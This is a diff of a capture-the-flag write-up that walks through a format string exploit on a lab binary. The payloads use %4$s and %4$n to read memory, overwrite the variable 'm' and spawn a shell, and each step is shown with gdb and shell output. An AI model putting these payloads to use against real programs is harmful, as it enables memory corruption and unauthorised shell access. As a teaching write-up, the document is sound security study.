@@ -39,26 +39,28 @@ Here, printf return the first value in the memory so it's working!
 
 First, we have to find the emplacement of the printf buffer in the memory.
 ```sh
-$ ./level3 <<< AAAA$(python -c "print('.%08x' * 4)")
-AAAA.00000200.b7fd1ac0.b7ff37d0.41414141
+$ ./level3 <<< AAAA$(python -c "print('.%x' * 4)")
+AAAA.200.b7fd1ac0.b7ff37d0.41414141
+```
+It's in the fourth position, ze can simplify this command bu using Direct Parameter Access.
+```sh
 
-$ ./level3 <<< AAAA%x%x%x%x
-AAAA200b7fd1ac0b7ff37d041414141
+
+$ ./level3 <<< 'AAAA | %4$x'
+AAAA | 41414141
 ```
 Here, we can see our buffer in hexa, meaning we found the emplacement.
 Now we can use this information to prepare our injection by shifting to the memory and try to access something.
 ```sh
-$ ./level3 <<< AAAA%x%x%x%s
+$ ./level3 <<< 'AAAA | %4$s'
 Segmentation fault (core dumped)
 ```
 In this example, we are printing 0x41414141 who segfault because it does  not exist in the memory. But we can try with something existing like the argument of the system function "/bin/sh" (0x804860d).
 ```sh
-$ ./level3 <<< $(printf "\x0d\x86\x04\x08")"%x%x%x | %s"
-200b7fd1ac0b7ff37d0 | /bin/sh
+$ ./level3 <<< $(python -c 'print("\x0d\x86\x04\x08" + "%4$s")')
+/bin/sh
 ```
-Look it's our memory!!
-
-Let's try now to modify "m" with this. For this we need the address of "m":
+Look it's our memory!! Now, let's try now to modify "m" with this. For this we need the address of "m":
 ```sh
 $ gdb -q ./level3 
 Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
@@ -88,15 +90,15 @@ We can see that 64 (0x40) is compared with the address **0x804988c**, it's "m".
 To modify the value, we have to use "%n" and we can play with "%x" and the field width to increment the value.
 
 ```sh
-(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%x%n
+(gdb) run <<< $(python -c 'print("\x8c\x98\x04\x08" + "%4$n")')
 (gdb) x/d 0x804988c
-0x804988c <m>:  23
+0x804988c <m>:  4
 ...
-(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%50x%n
+(gdb) run <<< $(python -c 'print("\x8c\x98\x04\x08" + "%20x%4$n")')
 (gdb) x/d 0x804988c
-0x804988c <m>:	65
+0x804988c <m>:	24
 ...
-(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%49x%n
+(gdb) run <<< $(python -c 'print("\x8c\x98\x04\x08" + "%60x%4$n")')
 (gdb) x/d 0x804988c
 0x804988c <m>:	64
 (gdb) c
@@ -105,7 +107,7 @@ Wait what?!
 ```
 As we saw, "m" is now equal to 64 and we run the shell. So the final command is: 
 ```sh
-$ (echo $(printf "\x8c\x98\x04\x08")%x%x%49x%n; cat) | ./level3 
+$ (python -c 'print("\x8c\x98\x04\x08" + "%60x%4$n")'; cat) | ./level3 
 �200b7fd1ac0                                         b7ff37d0
 Wait what?!
 whoami
